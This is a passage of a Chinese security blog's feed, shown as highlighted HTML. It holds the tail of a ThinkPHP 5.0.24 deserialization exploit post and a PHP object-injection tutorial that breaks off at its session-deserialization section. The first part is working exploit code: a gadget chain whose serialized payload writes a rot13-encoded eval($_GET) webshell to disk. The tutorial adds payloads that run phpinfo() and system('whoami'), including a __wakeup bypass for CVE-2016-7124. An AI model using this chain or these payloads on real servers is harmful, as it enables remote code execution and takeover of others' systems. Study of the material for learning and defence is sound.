class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#class Query</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation</span><span class="token punctuation">;</span><span class="token shell-comment comment">#OneToOne HasOne</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>Relation</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">OneToOne</span> <span class="token keyword">extends</span> <span class="token class-name">Relation</span><span class="token punctuation">{</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">HasOne</span> <span class="token keyword">extends</span> <span class="token class-name">OneToOne</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">parent</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">bindAttr</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"no"</span><span class="token punctuation">,</span><span class="token string">"123"</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>console</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>Memcached</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Output</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$handle</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handle</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Memcached</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用其write()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">styles</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getAttr'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Model</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>model<span class="token punctuation">\</span>relation<span class="token punctuation">\</span>HasOne</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>db<span class="token punctuation">\</span>Query</span><span class="token punctuation">;</span><span class="token keyword">abstract</span> <span class="token keyword">class</span> <span class="token class-name">Model</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$error</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$parent</span><span class="token punctuation">;</span><span class="token shell-comment comment">#修改处</span>    <span class="token keyword">protected</span> <span class="token variable">$selfRelation</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$query</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$aaaaa</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token keyword">parent</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Output对象,目的是调用__call()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">append</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">'getError'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">error</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">HasOne</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//Relation子类,且有getBindAttr()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">selfRelation</span> <span class="token operator">=</span> <span class="token boolean">false</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//isSelfRelation()</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">query</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Query</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>db</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Query</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>console<span class="token punctuation">\</span>Output</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Query</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$model</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">model</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">Output</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>session<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#Memcached</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver<span class="token punctuation">\</span>File</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Memcached</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$handler</span> <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">handler</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">File</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//目的调用File->set()</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>cache<span class="token punctuation">\</span>driver</span><span class="token punctuation">;</span><span class="token shell-comment comment">#File</span><span class="token keyword">class</span> <span class="token class-name">File</span><span class="token punctuation">{</span>    <span class="token keyword">protected</span> <span class="token variable">$options</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">protected</span> <span class="token variable">$tag</span><span class="token punctuation">;</span>    <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">options</span> <span class="token operator">=</span> <span class="token punctuation">[</span>            <span class="token string">'expire'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">,</span>            <span class="token string">'cache_subdir'</span>  <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token string">'prefix'</span>        <span class="token operator">=</span><span class="token operator">></span> <span class="token string">''</span><span class="token punctuation">,</span>            <span class="token string">'path'</span>          <span class="token operator">=</span><span class="token operator">></span> 'php<span class="token punctuation">:</span><span class="token comment" spellcheck="true">//filter/write=string.rot13/resource=./&lt;?cuc cucvasb();riny($_TRG[pzq]);?>',</span>            <span class="token string">'data_compress'</span> <span class="token operator">=</span><span class="token operator">></span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span> <span class="token operator">=</span> <span class="token boolean">true</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">namespace</span> <span class="token package">think<span class="token punctuation">\</span>model</span><span class="token punctuation">;</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>Model</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Pivot</span> <span class="token keyword">extends</span> <span class="token class-name">Model</span><span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token keyword">use</span> <span class="token package">think<span class="token punctuation">\</span>process<span class="token punctuation">\</span>pipes<span class="token punctuation">\</span>Windows</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token function">serialize</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Windows</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>poc只能对linux，windows限制了文件名，最后，文件的命名规则如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?</span>cuc <span class="token function">cucvasb</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">riny</span><span class="token punctuation">(</span><span class="token variable">$_TRG</span><span class="token punctuation">[</span>pzq<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> <span class="token operator">+</span> <span class="token function">md5</span><span class="token punctuation">(</span><span class="token string">'tag_'</span><span class="token punctuation">.</span><span class="token function">md5</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">tag</span><span class="token punctuation">)</span><span class="token punctuation">)</span></code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/4444/10.png" alt="" loading="lazy"></p><h4 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a><strong>参考文章</strong></h4><p><a href="https://www.anquanke.com/post/id/196364#h2-0" target="_blank" rel="noopener">https://www.anquanke.com/post/id/196364#h2-0</a></p><p><a href="http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/" target="_blank" rel="noopener">http://pines404.online/2020/01/20/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/ThinkPHP/ThinkPHP5.0.24%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%93%BE%E5%88%86%E6%9E%90/</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;这个洞的利用需要利用tp进行二次开发，当unserialize的参数可控，既可触发这个洞。在index控制器中写入：&lt;/p&gt;
&lt;pre class=&quot; language-php&quot;&gt;&lt;code class=&quot;language-php&quot;&gt;&lt;span class=&quot;token d
      
    
    </summary>
    
    
    
      <category term="代码审计" scheme="http://yoursite.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>php反序列化到pop链构造</title>
    <link href="http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/"/>
    <id>http://yoursite.com/2020/04/26/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%88%B0pop%E9%93%BE%E6%9E%84%E9%80%A0/</id>
    <published>2020-04-25T16:00:00.000Z</published>
    <updated>2020-04-29T06:53:41.508Z</updated>
    
    <content type="html"><![CDATA[<h4 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a><strong>序列化与反序列化</strong></h4><p>在php中，使用serialize和unserialize两个函数表示序列化与反序列化。</p><pre><code>serialize：把一个对象转化成字节流的字符串，序列化的对象会保存类的属性，不会保存方法unserialize：把字节流字符串转化成一个对象</code></pre><p>看下下面的列子，通过serialize序列化返回字符串</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token string">'fanxing'</span><span class="token punctuation">,</span><span class="token string">'20'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>返回字节流的字符串</p><pre><code>O:1:&quot;A&quot;:2:{s:4:&quot;name&quot;;s:7:&quot;fanxing&quot;;s:3:&quot;age&quot;;s:2:&quot;20&quot;;}</code></pre><p>O代表对象:长度:类的名字:类的属性个数:{类型:长度:属性名字;类型:长度:属性值;…}</p><p>反序列化列子如下：</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">// 属性</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span><span class="token variable">$age</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span> <span class="token operator">=</span> <span class="token variable">$age</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// 方法</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"My name is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">.</span><span class="token string">",I am is "</span><span class="token punctuation">.</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">age</span><span class="token punctuation">.</span><span class="token string">" years old!&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token string">'O:1:"A":2:{s:4:"name";s:7:"fanxing";s:3:"age";s:2:"20";}'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">Skill</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>打印出Skill方法中的值</p><p><code>My name is fanxing,I am is 20 years old!</code></p><h4 id="魔术方法"><a href="#魔术方法" class="headerlink" title="魔术方法"></a><strong>魔术方法</strong></h4><p>在学习php反序列漏洞前，都需要先了解php的魔术方法，常见的魔术方法如下：</p><p><strong>__construct()</strong>    </p><p>当一个对象被创建的时候调用该方法。</p><p><strong>__destruct()</strong></p><p>当一个对象被删除和销毁的时候调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象销毁调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__toString</strong></p><p>当一个对象被当成字符串的时候进行调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__toString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象字符串调用"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token string">"1"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__invoke</strong></p><p>当一个对象以函数的方式进行调用的时候会被调用。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用.&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__invoke</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象以函数调用"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__sleep</strong></p><p>对象在使用serialize函数前会先调用，在执行序列化的操作。</p><p><strong>__wakeup</strong></p><p>对象在使用unserialize函数前会先调用，在执行反序列化的操作。</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__sleep</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"序列化被调用&lt;br>"</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"反序列化被调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">A</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$s</span> <span class="token operator">=</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$s</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p><strong>__call</strong></p><p>对象在调用不可访问的方法的时候触发</p><p><strong>__callStatic</strong></p><p>在静态中调用不可访问的方法的时候会触发</p><p><strong>__set</strong></p><p>给不可以访问的属性赋值被调用</p><p><strong>__get</strong></p><p>读取不可访问的属性值被调用</p><p><strong>__isset</strong></p><p>不可访问的属性调用为 isset() 或 empty()时被调用</p><p><strong>__unset</strong></p><p>对不可以访问的属性使用unset会被调用</p><h4 id="对象注入"><a href="#对象注入" class="headerlink" title="对象注入"></a><strong>对象注入</strong></h4><p>满足unserialize参数可控和类中存在魔法方法，并且存在危险函数既进行对象注入</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">echo</span> <span class="token string">"对象创建调用&lt;br>"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>这里我们打印下序列化结果，发现属性的长度是7。</p><pre><code>O:1:&quot;A&quot;:1:{s:7:&quot;Aname&quot;;N;}</code></pre><p>这里需要注意的是成员属性使用的是private属性，在使用private和protected属性时，会在类名前后添加%00，即2个字符，使用urlencode打印出来看看。</p><pre><code>O%3A1%3A%22A%22%3A1%3A%7Bs%3A7%3A%22%00A%00name%22%3BN%3B%7D</code></pre><p>同样，也可以加属性名前面添加\00*\00，构造下pyalod直接执行了任意代码</p><pre><code>O%3A1%3A&quot;A&quot;%3A1%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A10%3A&quot;phpinfo%28)%3B&quot;%3B%7D</code></pre><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/1.png" alt="" loading="lazy"></p><p>在举一个列子，这里使用__wakeup魔法方法来来绕过，涉及到一个CVE-2016-7124漏洞，该漏洞影响版本：</p><pre><code>PHP5 &lt; 5.6.25PHP7 &lt; 7.0.10</code></pre><p>举个列子</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">A</span><span class="token punctuation">{</span>    <span class="token keyword">private</span> <span class="token variable">$name</span><span class="token operator">=</span><span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__wakeup</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'phpinfo();'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__destruct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token function">eval</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token function">unserialize</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span></code></pre><p>__wakeup会在反序列化之前执行，所以怎么样对象被销毁的时候都是要执行phpinfo的，那怎么绕过</p><p>__wakeup呢？需要构造如下序列化对象：</p><pre><code>O%3A1%3A&quot;A&quot;%3A2%3A%7Bs%3A7%3A&quot;%00A%00name&quot;%3Bs%3A17%3A&quot;system%28&quot;whoami&quot;%29%3B&quot;%3B%7D</code></pre><p>这里对象的属性个数是1，我设置为大于1就绕过了__wakeup，所以当序列化的结果的对象属性大于本身类的对象属性就可以绕过wakeup魔术方法。</p><p><img src="https://raw.githubusercontent.com/jfanx1ng/blog-img/master/ST/2222/2.png" alt="2" loading="lazy"></p><h4 id="Session反序列化"><a href="#Session反序列化" class="headerlink" 